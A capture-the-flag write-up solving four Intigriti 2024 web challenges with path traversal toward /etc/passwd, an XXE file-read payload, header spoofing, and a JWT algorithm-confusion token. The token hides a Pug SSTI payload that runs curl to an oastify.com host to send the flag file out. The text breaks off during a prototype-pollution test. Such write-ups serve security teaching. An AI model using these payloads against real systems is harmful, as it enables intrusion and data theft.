---
title: Intigriti CTF 2024 - WEB
date: 2024-11-18
tags: [ctf, web]
categories: [CTF Writeups]
author: 2Fa0n
img_path: /assets/img/Intigriti-ctf_2024
image: /assets/img/Intigriti-ctf_2024/intigriti_banner.png
---

## Pizza Paradise
**Solvers:** 395 <br>
**Author:** CryptoCat

### Description
Something weird going on at this pizza store!! <br>
![Pizza Paradise](/assets/img/Intigriti-ctf_2024/pizza_paradise.png)

### Solution
Looking around does not have any interesting things, let's check the `robots.txt` file.

```
User-agent: *
Disallow: /secret_172346606e1d24062e891d537e917a90.html
Disallow: /assets/
```

Let access the `/secret_172346606e1d24062e891d537e917a90.html` page. <br>
![Secret Page](/assets/img/Intigriti-ctf_2024/secret_page.png)

Check the source code of the page.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Top Secret Government Access</title>
        <link
            href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap"
            rel="stylesheet"
        />
        <link rel="stylesheet" href="/assets/css/secret-theme.css" />
        <script src="/assets/js/auth.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
        <script>
            function hashPassword(password) {
                return CryptoJS.SHA256(password).toString();
            }

            function validate() {
                const username = document.getElementById("username").value;
                const password = document.getElementById("password").value;

                const credentials = getCredentials();
                const passwordHash = hashPassword(password);

                if (
                    username === credentials.username &&
                    passwordHash === credentials.passwordHash
                ) {
                    return true;
                } else {
                    alert("Invalid credentials!");
                    return false;
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Top Secret Government Access</h1>
            <form id="loginForm" action="login.php" method="POST" onsubmit="return validate();">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required /><br />
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required /><br />
                <input type="submit" value="Login" />
            </form>
        </div>
    </body>
</html>
```

We can see that the password is hashed using SHA256 and the credentials are stored in the `/assets/js/auth.js` file.

```js
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```

Let crack the password hash using [CrackStation](https://crackstation.net/). <br>

![CrackStation](/assets/img/Intigriti-ctf_2024/crackstation.png)

We have the credentials, let's login.

```
username: agent_1337
password: intel420
```

Login successfully and access to the portal and download the secret file. <br>

![Portal](/assets/img/Intigriti-ctf_2024/portal.png)

When we click download the secret file, we get the GET request in burp suite.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/topsecret1.png
```

Let try `/etc/passwd`.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/etc/passwd
```

The response is `File path not allowed!`.
Try path traversal inside the `/assets/images` directory.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../etc/passwd
```

It gets `File not found!` so it works!

We will try to get the source code of this file `topsecret_a9aedc6c39f654e55275ad8e65e316b3.php`.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

![Source Code](/assets/img/Intigriti-ctf_2024/source_code.png)

We can see the flag inside the source code.

```php
$flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
```

**Flag:** `INTIGRITI{70p_53cr37_m15510n_c0mpl373}`

## Biocorp
**Solvers:** 389 <br>
**Author:** CryptoCat

### Description
BioCorp contacted us with some concerns about the security of their network. Specifically, they want to make sure they've decoupled any dangerous functionality from the public facing website. Could you give it a quick review? <br>
![Biocorp](/assets/img/Intigriti-ctf_2024/biocorp.png)

### Solution
We look around the website and find nothing interesting. Let's check the source code which is provided by the challenge. <br>
![Biocorp Source Code](/assets/img/Intigriti-ctf_2024/biocorp_source_code.png)

We notice some interesting things in the source code.
```php
<?php
$ip_address = $_SERVER['HTTP_X_BIOCORP_VPN'] ?? $_SERVER['REMOTE_ADDR'];

if ($ip_address !== '80.187.61.102') {
    echo "<h1>Access Denied</h1>";
    echo "<p>You do not have permission to access this page.</p>";
    exit;
}
```

We can see the ip for the vpn is `80.187.61.102` that can be access to other restricted pages.
Let's access that page with by adding the header `X-Biocorp-Vpn: 80.187.61.102` to the request.
![Biocorp Panel](/assets/img/Intigriti-ctf_2024/biocorp_panel.png)

We are now access to the restricted page. Let's continue to check the source code of the page.
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {
    $xml_data = file_get_contents('php://input');
    $doc = new DOMDocument();
    if (!$doc->loadXML($xml_data, LIBXML_NOENT)) {
        echo "<h1>Invalid XML</h1>";
        exit;
    }
} else {
    $xml_data = file_get_contents('data/reactor_data.xml');
    $doc = new DOMDocument();
    $doc->loadXML($xml_data, LIBXML_NOENT);
}
```

We can see that this page display the content of the `reactor_data.xml` file. And it also accept the POST request with the content type is `application/xml`.

This is the typical XML External Entity (XXE) attack. We can read the file from the local file system.

Let's try to read the `flag.txt` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<reactor>
    <status>
        <temperature>&xxe;</temperature>
        <pressure>1337</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>
```
![Biocorp Flag](/assets/img/Intigriti-ctf_2024/biocorp_flag.png)

We have the flag.

**Flag:** `INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}`

## Cat Club
**Solvers:** 130 <br>
**Author:** CryptoCat

### Description
People are always complaining that there's not enough cat pictures on the internet.. Something must be done!! <br>
![Cat Club](/assets/img/Intigriti-ctf_2024/cat_club.png)

### Solution
Create a new account and login to view more cat pictures. <br>
![Cat Club Login](/assets/img/Intigriti-ctf_2024/cat_club_login.png)

Walk through and nothing special except the name of our account is reflected in the page title. Let's check the source code from the challenge provider. <br>
![Cat Club Source Code](/assets/img/Intigriti-ctf_2024/cat_club_source_code.png)

We can see the file `sanitizer.js` is used to sanitize the username with regex that only allow the letters and numbers. <br>
```js
const { BadRequest } = require("http-errors");

function sanitizeUsername(username) {
    const usernameRegex = /^[a-zA-Z0-9]+$/;

    if (!usernameRegex.test(username)) {
        throw new BadRequest("Username can only contain letters and numbers.");
    }

    return username;
}

module.exports = {
    sanitizeUsername,
};
```
Let's check the code where the username is reflected in the page title. <br>
```js
router.get("/cats", getCurrentUser, (req, res) => {
    if (!req.user) {
        return res.redirect("/login?error=Please log in to view the cat gallery");
    }

    const templatePath = path.join(__dirname, "views", "cats.pug");

    fs.readFile(templatePath, "utf8", (err, template) => {
        if (err) {
            return res.render("cats");
        }

        if (typeof req.user != "undefined") {
            template = template.replace(/guest/g, req.user);
        }

        const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });

        res.send(html);
    });
});
```

Hmm, it seems like there is an interesting thing here. <br>
```js
const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });
```

The username is reflected by the pug template. It seems to be vulnerable to the SSTI attack. Let's check [SSTI HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). Check the pug template. <br>
![Cat Club Pug Template](/assets/img/Intigriti-ctf_2024/cat_club_pug_template.png)

If now we test out the `#{7*7}` to see if it works. It will not work because the username is sanitized by the `sanitizer.js` file. Let's check the middleware of `getCurrentUser`. <br>
```js
function getCurrentUser(req, res, next) {
    const token = req.cookies.token;

    if (token) {
        verifyJWT(token)
            .then((payload) => {
                req.user = payload.username;
                res.locals.user = req.user;
                next();
            })
            .catch(() => {
                req.user = null;
                res.locals.user = null;
                next();
            });
    } else {
        req.user = null;
        res.locals.user = null;
        next();
    }
}
```

We can see the token is verified by the `verifyJWT` function. Let's check it out. <br>
```js
const jwt = require("json-web-token");
const fs = require("fs");
const path = require("path");

const privateKey = fs.readFileSync(path.join(__dirname, "..", "private_key.pem"), "utf8");
const publicKey = fs.readFileSync(path.join(__dirname, "..", "public_key.pem"), "utf8");

function signJWT(payload) {
    return new Promise((resolve, reject) => {
        jwt.encode(privateKey, payload, "RS256", (err, token) => {
            if (err) {
                return reject(new Error("Error encoding token"));
            }
            resolve(token);
        });
    });
}

function verifyJWT(token) {
    return new Promise((resolve, reject) => {
        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
            return reject(new Error("Invalid token format"));
        }

        jwt.decode(publicKey, token, (err, payload, header) => {
            if (err) {
                return reject(new Error("Invalid or expired token"));
            }

            if (header.alg.toLowerCase() === "none") {
                return reject(new Error("Algorithm 'none' is not allowed"));
            }

            resolve(payload);
        });
    });
}

module.exports = { signJWT, verifyJWT };
```

We can see that if the algorithm is `none`, it will be rejected. What if we can make the algorithm confusion? Look through the internet and found out this site [JWT Algorithm Confusion](https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355). <br>

The reason we choose this CVE-2023-48238 is because the `json-web-token` in the `package.json` has 3.0.0 version. And the affected version is **< 3.1.1** so we can exploit it. <br>
```json
{
    "name": "cat-club",
    "version": "4.2.0",
    "main": "app/app.js",
    "scripts": {
        "start": "node app/app.js"
    },
    "dependencies": {
        "bcryptjs": "^2.4.3",
        "cookie-parser": "^1.4.6",
        "dotenv": "^16.4.5",
        "pug": "^3.0.3",
        "express": "^4.21.0",
        "express-session": "^1.18.0",
        "json-web-token": "~3.0.0",
        "pg": "^8.12.0",
        "sequelize": "^6.37.3"
    },
    "devDependencies": {
        "nodemon": "^3.1.4"
    },
    "engines": {
        "node": ""
    },
    "license": "MIT",
    "keywords": [],
    "author": "",
    "description": ""
}
```

We can also get the public key from `/jwks.json`. <br>
```js
router.get("/jwks.json", async (req, res) => {
    try {
        const publicKey = await fsPromises.readFile(path.join(__dirname, "..", "public_key.pem"), "utf8");
        const publicKeyObj = crypto.createPublicKey(publicKey);
        const publicKeyDetails = publicKeyObj.export({ format: "jwk" });

        const jwk = {
            kty: "RSA",
            n: base64urlEncode(Buffer.from(publicKeyDetails.n, "base64")),
            e: base64urlEncode(Buffer.from(publicKeyDetails.e, "base64")),
            alg: "RS256",
            use: "sig",
        };

        res.json({ keys: [jwk] });
    } catch (err) {
        res.status(500).json({ message: "Error generating JWK" });
    }
});
```
![Cat Club JWK](/assets/img/Intigriti-ctf_2024/cat_club_jwk.png)

Let's exploit <br>
First, let's create a script to extract and format the public key from the JWKS endpoint: <br>
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64
import json

jwks = {
    "keys": [{
        "kty": "RSA",
        "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
        "e": "AQAB",
        "alg": "RS256",
        "use": "sig"
    }]
}

key_data = jwks["keys"][0]
n = int.from_bytes(base64.urlsafe_b64decode(key_data["n"] + "=="), byteorder="big")
e = int.from_bytes(base64.urlsafe_b64decode(key_data["e"] + "=="), byteorder="big")

public_key = rsa.RSAPublicNumbers(e, n).public_key()

pem_public_key = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("public_key.pem", "wb") as f:
    f.write(pem_public_key)
```

But the JWT is using `RS256` alg so we need to change to `HS256` and then inject payload into username. <br>
![Cat Club SSTI](/assets/img/Intigriti-ctf_2024/cat_club_ssti.png)

Then use jwt_tool to create a malicious token with algorithm confusion: <br>
```bash
python3 jwt_tool.py --exploit k -pk public_key.pem "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIHZoZzk4bWxlN21rcTQwZ3lvNHM3MzExZjI2OHh3cmtnLm9hc3RpZnkuY29tYGNhdCAvZmxhZypgJyl9KCl9In0.L8Z5MJNc5VTuBu9w5IFLnE6Slt5H5pJDCd_0xAgstz8"
```
![Cat Club JWT](/assets/img/Intigriti-ctf_2024/cat_club_jwt.png)
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIDllb241MGlzNDBoNDFlZGNsaXBsMGZ5dHprNWJ0Nmh2Lm9hc3RpZnkuY29tL2BjYXQgL2ZsYWcqYCcpfSgpfSJ9.7UG2A-miTBExSXBWoIh1TPsJdkOIUV5pEoBCZCqIm5U
```

Check the burp collaborator and we got the flag. <br>
![Cat Club Flag](/assets/img/Intigriti-ctf_2024/cat_club_flag.png)

**Flag:** `INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}`

## Work Break
**Solvers:** 26 <br>
**Author:** a_l & wubz

### Description
Your work portal contains multiple web vulnerabilities. Can you identify them and extract the session cookie of a support team member? <br>
Credits: Amit Laish & Dor Konis - GE Vernova <br>
![Work Break](/assets/img/Intigriti-ctf_2024/work_break.png)

### Solution
Just signup and login to the page. <br>
![Work Break Login](/assets/img/Intigriti-ctf_2024/work_break_login.png)

Now we are in the profile of our account. We can edit to add or change "Name", "Phone", "Position". It also display the performance chart, maybe to keep track of the employee's performance. <br>
There is also a chat feature that we can send message to get support. <br>
![Work Break Chat](/assets/img/Intigriti-ctf_2024/work_break_chat.png)

View source of the profile page and we can see there are `chat.js` and `profile.js` file. <br>
![Work Break Source Code](/assets/img/Intigriti-ctf_2024/work_break_source_code.png)

Let's check the `chat.js` file. <br>
```js
document.addEventListener("DOMContentLoaded", () => {
    const chatButton = document.getElementById("chatButton");
    const chatWindow = document.getElementById("chatWindow");
    const closeChat = document.getElementById("closeChat");
    const chatForm = document.getElementById("chatForm");
    const chatInput = document.getElementById("chatInput");
    const chatMessages = document.getElementById("chatMessages");

    chatButton.addEventListener("click", () => {
        chatWindow.style.display = chatWindow.style.display === "none" ? "flex" : "none";
    });

    closeChat.addEventListener("click", () => {
        chatWindow.style.display = "none";
    });

    chatForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const message = chatInput.value.trim();

        if (message === "") return;

        appendMessage("user", message);
        chatInput.value = "";

        try {
            const response = await fetch("/api/support/chat", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ message }),
            });

            const data = await response.json();

            if (Array.isArray(data.supportResponse)) {
                data.supportResponse.forEach((msg) => {
                    appendMessage("support", msg);
                });
            } else {
                appendMessage("support", data.supportResponse);
            }
        } catch (error) {
            appendMessage("support", "An error occurred. Please try again later.");
        }
    });

    const appendMessage = (sender, message) => {
        const messageElement = document.createElement("div");
        messageElement.classList.add("chat-message", sender);
        const messageText = document.createElement("span");
        messageText.classList.add("message-text");
        messageText.textContent = message;
        messageElement.appendChild(messageText);
        chatMessages.appendChild(messageElement);

        chatMessages.scrollTop = chatMessages.scrollHeight;
    };
});
```

It seems like just a normal sent and show the message. Let's check the `profile.js` file. <br>
```js
const getUserIdFromUrl = () => {
    const path = window.location.pathname;
    const segments = path.split("/");
    return segments[segments.length - 1];
};

const setError = (error) => {
    const errorText = document.getElementById("errorText");
    errorText.innerText = error;

    errorText.addEventListener("transitionend", () => {
        errorText.innerText = "";
        errorText.classList.remove("fade-out");
    });
    errorText.classList.add("fade-out");
};

let userTasks = [];
document.addEventListener("DOMContentLoaded", async function () {
    const logoutButton = document.getElementById("logoutButton");
    const performanceIframe = document.getElementById("performanceIframe");
    const profileForm = document.getElementById("profileForm");
    const editButton = document.getElementById("editButton");
    const submitButton = document.getElementById("submitButton");
    const emailField = document.getElementById("email");
    const nameField = document.getElementById("name");
    const phoneField = document.getElementById("phone");
    const positionField = document.getElementById("position");
    const userId = getUserIdFromUrl();

    try {
        const response = await fetch(`/api/user/profile/${userId}`);
        const profileData = await response.json();
        if (response.ok) {
            const userSettings = Object.assign(
                { name: "", phone: "", position: "" },
                profileData.assignedInfo
            );

            if (!profileData.ownProfile) {
                editButton.style.display = "none";
            } else {
                editButton.style.display = "inline-block";
            }

            emailField.value = profileData.email;
            nameField.value = userSettings.name;
            phoneField.value = userSettings.phone;
            positionField.value = userSettings.position;

            userTasks = userSettings.tasks || [];
            performanceIframe.addEventListener("load", () => {
                performanceIframe.contentWindow.postMessage(userTasks, "*");
            });
        } else if (response.unauthorized) {
            window.location.href = "/login";
        } else {
            setError(profileData.error);
        }
    } catch (error) {
        console.log("Error fetching profile: " + error.message);
    }

    editButton.addEventListener("click", () => {
        nameField.disabled = false;
        phoneField.disabled = false;
        positionField.disabled = false;

        nameField.classList.add("editable");
        phoneField.classList.add("editable");
        positionField.classList.add("editable");

        submitButton.style.display = "inline-block";
        editButton.style.display = "none";
    });

    profileForm.addEventListener("submit", async (e) => {
        e.preventDefault();

        const updatedSettings = {
            name: nameField.value,
            phone: phoneField.value,
            position: positionField.value,
        };

        try {
            const response = await fetch("/api/user/settings", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(updatedSettings),
            });

            if (response.ok) {
                alert("Profile updated successfully!");
                nameField.disabled = true;
                phoneField.disabled = true;
                positionField.disabled = true;

                nameField.classList.remove("editable");
                phoneField.classList.remove("editable");
                positionField.classList.remove("editable");

                submitButton.style.display = "none";
                editButton.style.display = "inline-block";
            } else if (response.unauthorized) {
                window.location.href = "/login";
            } else {
                const errorData = await response.json();
                setError(errorData.error);
            }
        } catch (error) {
            setError(error.message);
        }
    });

    logoutButton.addEventListener("click", async function () {
        try {
            const response = await fetch("/api/auth/logout", {
                method: "POST",
            });

            if (response.ok) {
                window.location.href = "/login";
            } else {
                const errorData = await response.json();
                console.log("Logout failed: " + errorData.message);
            }
        } catch (error) {
            console.log("Error during logout: " + error.message);
        }
    });
});

window.onresize = () => performanceIframe.contentWindow.postMessage(userTasks, "*");

// Not fully implemented - total tasks
window.addEventListener(
    "message",
    (event) => {
        if (event.source !== frames[0]) return;

        document.getElementById(
            "totalTasks"
        ).innerHTML = `<p>Total tasks completed: ${event.data.totalTasks}</p>`;
    },
    false
);
```

We found some interesting part in the code. <br>
```js
const userSettings = Object.assign(
    { name: "", phone: "", position: "" },
    profileData.assignedInfo
);
```

- Object.assign() merges all properties from source into target.
- The `profileData.assignedInfo` is from the `/api/user/profile/:id` endpoint.
- There is no validation for the `profileData.assignedInfo` so we can inject the `tasks` property.

Let's update the profile and we can see the burp have POST request to `/api/user/settings` endpoint. <br>
![Work Break Profile](/assets/img/Intigriti-ctf_2024/work_break_profile.png)
![Work Break Settings](/assets/img/Intigriti-ctf_2024/work_break_settings.png)

Let's test out simple prototype pollution if we can inject more properties. <br>
```json
{
    "name":"Anon",
    "phone":"0123456789",
    "position":"pentest",
    "__proto__": {
        "isAdmin": true
    }
}
```
